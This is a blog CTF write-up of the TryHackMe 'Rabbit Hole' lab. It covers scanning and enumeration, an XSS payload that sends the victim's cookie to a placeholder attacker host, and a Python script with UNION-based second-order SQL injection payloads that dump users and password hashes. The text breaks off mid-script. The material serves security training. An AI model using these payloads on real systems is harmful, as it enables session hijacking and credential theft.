<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Rabbit Hole</title>
<meta name=description content="Platform: TryHackMe Link: Rabbit Hole Level: Hard OS: Linux Rabbit Hole is all about exploiting SQL injection. We discover a second-order SQL injection …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/posts/thm-rabbithole/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Rabbit Hole"><meta property="og:description" content="Platform: TryHackMe Link: Rabbit Hole Level: Hard OS: Linux Rabbit Hole is all about exploiting SQL injection. We discover a second-order SQL injection …"><meta property="og:image" content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Rabbit Hole"><meta name=twitter:description content="Platform: TryHackMe Link: Rabbit Hole Level: Hard OS: Linux Rabbit Hole is all about exploiting SQL injection. We discover a second-order SQL injection …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/thm-rabbithole/"><meta property="twitter:url" content="https://scorpiosec.com/posts/thm-rabbithole/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png"><link rel=canonical href=https://scorpiosec.com/posts/thm-rabbithole/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/thm-rabbithole/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Rabbit Hole</h1><small role=doc-subtitle></small><p class=post-date>9 min read |
<span class=post-date>October 29, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=https://tryhackme.com/r/room/rabbitholeqq>Rabbit Hole</a></li><li>Level: Hard</li><li>OS: Linux</li></ul><hr><p>Rabbit Hole is all about exploiting SQL injection. We discover a second-order SQL injection vulnerability after some failed Cross-Site scripting (XSS) attempts. Using this, we retrieve some password hashes, but they don’t lead to initial access. By combining a python script and a payload leveraging the <code>PROCESSLIST</code> command we successfully extract the query containing the <code>admin</code> user password which we use to login via SSH and read the flag.</p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.233.57 Rabbit_Hole
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-29 18:11 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.233.57
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.22s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.59 <span style=color:#56b6c2>((</span>Debian<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>| http-cookie-flags: 
</span></span><span style=display:flex><span>|   /: 
</span></span><span style=display:flex><span>|     PHPSESSID: 
</span></span><span style=display:flex><span>|_      httponly flag not <span style=color:#e5c07b>set</span>
</span></span><span style=display:flex><span>|_http-title: Your page title here :<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.59 <span style=color:#56b6c2>(</span>Debian<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 14.03 seconds
</span></span></code></pre></div><p>Our Nmap scan finds two open ports 22 (SSH) and 80 (HTTP), let&rsquo;s check the web server.</p><h2 id=enumeration>Enumeration</h2><p>At <code>http://rabbithole.thm/</code> we find a website for a recruitment campaign with some authentication feature, we are also told that &ldquo;anti-bruteforce measures are in place&rdquo;.</p><p><img src=/images/THM-RabbitHole/rabbit_hole_website.png alt="Rabbit Hole website"></p><p>Let&rsquo;s create an account and login.</p><p><img src=/images/THM-RabbitHole/rabbithole_register.png alt="Account registration"></p><p>On the login page we notice a different message. It tells us that the anti-bruteforce measures are <code>implemented with database queries</code>.</p><p><img src=/images/THM-RabbitHole/rabbithole_loginpage.png alt="Login page"></p><p>We find a page displaying the last users logins.</p><p><img src=/images/THM-RabbitHole/rabbithole_logins.png alt="Users last logins"></p><p>We are not able to do anything on this page but logout. But if we pay close attention to the login times for <code>admin</code> we notice that the user logs in <strong>every minute</strong> which is odd. Moreover our username is reflected on the website, this can imply a possibility for attacks such as XSS, SQLi, and more.</p><p>Before exploring the possible vulnerabilities let&rsquo;s enumerate the target some more.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://rabbithole.thm
</code></pre><p><img src=/images/THM-RabbitHole/rabbithole_gobuster.png alt="Gobuster directory enumeration"></p><p>The directory enumeration is unfruitful so we move on to subdomain enumeration.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://rabbithole.thm -H &#34;Host: FUZZ.axlle.htb&#34; -ic -fs 723
</code></pre><p>This also does not provide any leads.</p><p><img src=/images/THM-RabbitHole/rabbithole_ffuf.png alt="Ffuf subdomain enumeration"></p><p>We notice that our cookie value is the same for different logins which is not desirable. This would allow attackers to execute some sessions attacks such as session fixation and replay attacks. In our case it means that if we can get our hands on the admin cookie value we can probabbly login as them.</p><p><img src=/images/THM-RabbitHole/cookievalue_loggedin.png alt="cookie value first login"></p><p><img src=/images/THM-RabbitHole/2nd_login.png alt="cookie value second login"></p><h3 id=xss-attempt>XSS Attempt</h3><p>Let&rsquo;s attempt some cookie stealing, since the <code>username</code> is reflected we will use it.</p><p><img src=/images/THM-RabbitHole/burp_req.png alt="Burp request"></p><p>We are able to register an account with the payload below as the <code>username</code>.</p><pre tabindex=0><code>&lt;script&gt;var i=new Image(); i.src=&#34;http://YOUR_IP:WEBSERVER_PORT/?cookie=&#34;+btoa(document.cookie);&lt;/script&gt;
</code></pre><p><img src=/images/THM-RabbitHole/payload_as_username.png alt="Payload for username"></p><p>But logging in with that account produces an error. It reveals that the application is using MariaDB which is just a modified version of MySQL.</p><p><img src=/images/THM-RabbitHole/login_error_SQLi.png alt="Payload Login error"></p><p>This hints at a <strong>second order SQL injection</strong>. We injected the malicious code via our payload when registering the account and it was executed when we logged in. Since the payload did not create any issues at the registering we know that the character <code>"</code> is the one causing problems here, which is good as it will serve us for our subsequent SQLis.</p><p>Checking our webserver we received some cookie values.</p><p><img src=/images/THM-RabbitHole/cookie_value_xss.png alt="cookie value received"></p><p>Unfortunately everytime I try using one of them I just get logged out, so we can just move to another attack path.</p><h3 id=second-order-sql-injection>Second Order SQL injection</h3><p>The tedious part here is that in order to test our different SQLi payloads we need to create a new user with them and then login to be able to read the query output which is not ideal.</p><p>So we will automate the process with the Python script below.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>sys</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;http://</span><span style=color:#98c379>{</span><span style=color:#e06c75>ip</span><span style=color:#98c379>}</span><span style=color:#98c379>/register.php&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;username&#39;</span>: <span style=color:#e06c75>payload</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;password&#39;</span>: <span style=color:#98c379>&#39;password&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;submit&#39;</span>: <span style=color:#98c379>&#39;Submit Query&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>status_code</span> <span style=color:#56b6c2>==</span> <span style=color:#d19a66>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;http://</span><span style=color:#98c379>{</span><span style=color:#e06c75>ip</span><span style=color:#98c379>}</span><span style=color:#98c379>/login.php&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;username&#39;</span>: <span style=color:#e06c75>payload</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;password&#39;</span>: <span style=color:#98c379>&#39;password&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;login&#39;</span>: <span style=color:#98c379>&#39;Submit Query&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>text</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>) <span style=color:#56b6c2>!=</span> <span style=color:#d19a66>3</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Usage: python3 auto_sqli.py &lt;IP_ADDRESS&gt; &lt;PAYLOAD&gt;&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>exit</span>(<span style=color:#d19a66>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>ip</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#e06c75>payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>2</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[+] Creating user with payload: </span><span style=color:#98c379>{</span><span style=color:#e06c75>payload</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e06c75>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] User created successfully. Attempting login...&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>response_text</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>)
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Login response:&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#e06c75>response_text</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[-] Failed to create user. Check the payload or connection.&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#e06c75>__name__</span> <span style=color:#56b6c2>==</span> <span style=color:#98c379>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>main</span>()
</span></span></code></pre></div><p>We will use our script to find the number of columns expected.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/S_SQLi_test.png alt="Second Order SQLi test"></p><p>We can read the error message <code>SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns</code>.</p><p>Let&rsquo;s increment the number of columns with the following payload.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, 2; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/S_SQLi_test2.png alt="Second Order SQLi test2"></p><p>This payload works, confirming that <strong>2</strong> columns are expected.</p><p>It will be good to know which database we are currently working with.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, database(); --&#39;
</code></pre><blockquote><p>If at any point you notice that the IP address is different, it&rsquo;s because I had lost some of the screenshots and I had to go back and retake them.</p></blockquote><p><img src=/images/THM-RabbitHole/current_DB.png alt="Second Order SQLi test2"></p><p>We are currently in the <code>web</code> database, now we list its tables.</p><p><img src=/images/THM-RabbitHole/S_SQLi_enum.png alt="web database content"></p><p>We discover two tables <code>users</code> and <code>logins</code>, the first one seems interesting.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=&#34;users&#34; AND table_schema=DATABASE(); --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/S_SQLi_enum2.png alt="users table fields"></p><p>This table has four fields: <code>id</code>, <code>username</code>, <code>password</code>, and <code>group</code>. We will check <code>username</code> first to see if there are other users.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, username FROM web.users; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/username_list.png alt="username field content"></p><p>Besides <code>admin</code>, we find <code>foo</code> and <code>bar</code>.</p><p>Now let&rsquo;s list the content of <code>password</code>.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, password FROM web.users; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/S_SQLi_enum3.png alt="incomplete hashes"></p><p>We are able to dump the hashes but there is a 16-character limit, resulting in incomplete hashes. In order to overcome this hurdle we will modify our script making use of <code>SUBSTRING</code> to split the query into two parts.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>sys</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>bs4</span> <span style=color:#c678dd>import</span> <span style=color:#e06c75>BeautifulSoup</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;http://</span><span style=color:#98c379>{</span><span style=color:#e06c75>ip</span><span style=color:#98c379>}</span><span style=color:#98c379>/register.php&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;username&#39;</span>: <span style=color:#e06c75>payload</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;password&#39;</span>: <span style=color:#98c379>&#39;password&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;submit&#39;</span>: <span style=color:#98c379>&#39;Submit Query&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>status_code</span> <span style=color:#56b6c2>==</span> <span style=color:#d19a66>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;http://</span><span style=color:#98c379>{</span><span style=color:#e06c75>ip</span><span style=color:#98c379>}</span><span style=color:#98c379>/login.php&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;username&#39;</span>: <span style=color:#e06c75>payload</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;password&#39;</span>: <span style=color:#98c379>&#39;password&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;login&#39;</span>: <span style=color:#98c379>&#39;Submit Query&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>text</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>extract_results</span>(<span style=color:#e06c75>html</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>soup</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>BeautifulSoup</span>(<span style=color:#e06c75>html</span>, <span style=color:#98c379>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>results</span> <span style=color:#56b6c2>=</span> []
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>td</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>soup</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>find_all</span>(<span style=color:#98c379>&#39;td&#39;</span>):
</span></span><span style=display:flex><span>        <span style=color:#e06c75>content</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>td</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>get_text</span>()<span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>()
</span></span><span style=display:flex><span>        <span style=color:#7f848e># Filter out timestamp entries (they start with year)</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#56b6c2>not</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>startswith</span>(<span style=color:#98c379>&#39;202&#39;</span>):  <span style=color:#7f848e># Assumes timestamps start with 202x</span>
</span></span><span style=display:flex><span>            <span style=color:#e06c75>results</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>append</span>(<span style=color:#e06c75>content</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>results</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>modify_payload</span>(<span style=color:#e06c75>payload</span>, <span style=color:#e06c75>substring_range</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>select_pos</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>upper</span>()<span style=color:#56b6c2>.</span><span style=color:#e06c75>find</span>(<span style=color:#98c379>&#39;SELECT&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>from_pos</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>upper</span>()<span style=color:#56b6c2>.</span><span style=color:#e06c75>find</span>(<span style=color:#98c379>&#39;FROM&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e06c75>select_pos</span> <span style=color:#56b6c2>==</span> <span style=color:#56b6c2>-</span><span style=color:#d19a66>1</span> <span style=color:#56b6c2>or</span> <span style=color:#e06c75>from_pos</span> <span style=color:#56b6c2>==</span> <span style=color:#56b6c2>-</span><span style=color:#d19a66>1</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#e06c75>payload</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#e06c75>select_clause</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span>[<span style=color:#e06c75>select_pos</span>:<span style=color:#e06c75>from_pos</span>]
</span></span><span style=display:flex><span>    <span style=color:#e06c75>rest_of_query</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span>[<span style=color:#e06c75>from_pos</span>:]
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#e06c75>columns</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>select_clause</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>replace</span>(<span style=color:#98c379>&#39;SELECT&#39;</span>, <span style=color:#98c379>&#39;&#39;</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>()<span style=color:#56b6c2>.</span><span style=color:#e06c75>split</span>(<span style=color:#98c379>&#39;,&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#e06c75>modified_columns</span> <span style=color:#56b6c2>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span>, <span style=color:#e06c75>col</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>enumerate</span>(<span style=color:#e06c75>columns</span>):
</span></span><span style=display:flex><span>        <span style=color:#e06c75>col</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>col</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>()
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>==</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>columns</span>) <span style=color:#56b6c2>-</span> <span style=color:#d19a66>1</span>:  <span style=color:#7f848e># Last column</span>
</span></span><span style=display:flex><span>            <span style=color:#7f848e># Handle both simple columns and expressions</span>
</span></span><span style=display:flex><span>            <span style=color:#e06c75>col_content</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>col</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>(<span style=color:#98c379>&#39;1234567890 &#39;</span>)  <span style=color:#7f848e># Remove any numeric values</span>
</span></span><span style=display:flex><span>            <span style=color:#c678dd>if</span> <span style=color:#e06c75>col_content</span>:  <span style=color:#7f848e># If there&#39;s a non-numeric column</span>
</span></span><span style=display:flex><span>                <span style=color:#e06c75>col</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;SUBSTRING(</span><span style=color:#98c379>{</span><span style=color:#e06c75>col</span><span style=color:#98c379>}</span><span style=color:#98c379>, </span><span style=color:#98c379>{</span><span style=color:#e06c75>substring_range</span>[<span style=color:#d19a66>0</span>]<span style=color:#98c379>}</span><span style=color:#98c379>, </span><span style=color:#98c379>{</span><span style=color:#e06c75>substring_range</span>[<span style=color:#d19a66>1</span>]<span style=color:#98c379>}</span><span style=color:#98c379>)&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e06c75>modified_columns</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>append</span>(<span style=color:#e06c75>col</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#e06c75>modified_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span>[:<span style=color:#e06c75>select_pos</span>] <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#39;SELECT &#39;</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#39;, &#39;</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>(<span style=color:#e06c75>modified_columns</span>) <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#39; &#39;</span> <span style=color:#56b6c2>+</span> <span style=color:#e06c75>rest_of_query</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>modified_payload</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>) <span style=color:#56b6c2>!=</span> <span style=color:#d19a66>3</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Usage: python3 auto_sqli.py &lt;IP_ADDRESS&gt; &lt;PAYLOAD&gt;&#34;</span>)
